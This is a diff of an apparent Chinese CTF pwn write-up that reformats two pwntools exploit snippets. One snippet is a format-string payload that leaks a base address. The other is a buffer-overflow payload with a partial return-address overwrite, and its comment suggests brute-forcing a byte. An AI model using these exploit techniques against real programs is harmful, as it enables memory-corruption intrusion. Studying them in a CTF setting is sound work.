@@ -27,43 +27,9 @@
 
 
 ```
-
-p
-.
-sendline
-(
-b
-'aaaa%12$p'
-)
-
-p
-.
-recvuntil
-(
-b
-'aaaa'
-)
-
-base_addr
-
-=
-
-int
-(
-p
-.
-recv
-(
-14
-),
-16
-)
--
-offset
-
-
-# offset为偏移地址，这个需要动态调试查看
-
+p.sendline(b'aaaa%12$p')
+p.recvuntil(b'aaaa')
+base_addr = int(p.recv(14),16)-offset # offset为偏移地址，这个需要动态调试查看
 ```
 
 
@@ -79,31 +45,5 @@ exp:
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-0x30
-
-+
-
-b
-'a'
-*
-0x8
-
-+
-
-b
-'
-\xC5\x09
-'
-
-
-# 第二字节可能\x19、\x29...尝试一下
-
+payload = b'a'*0x30 + b'a'*0x8 + b'\xC5\x09' # 第二字节可能\x19、\x29...尝试一下
 ```
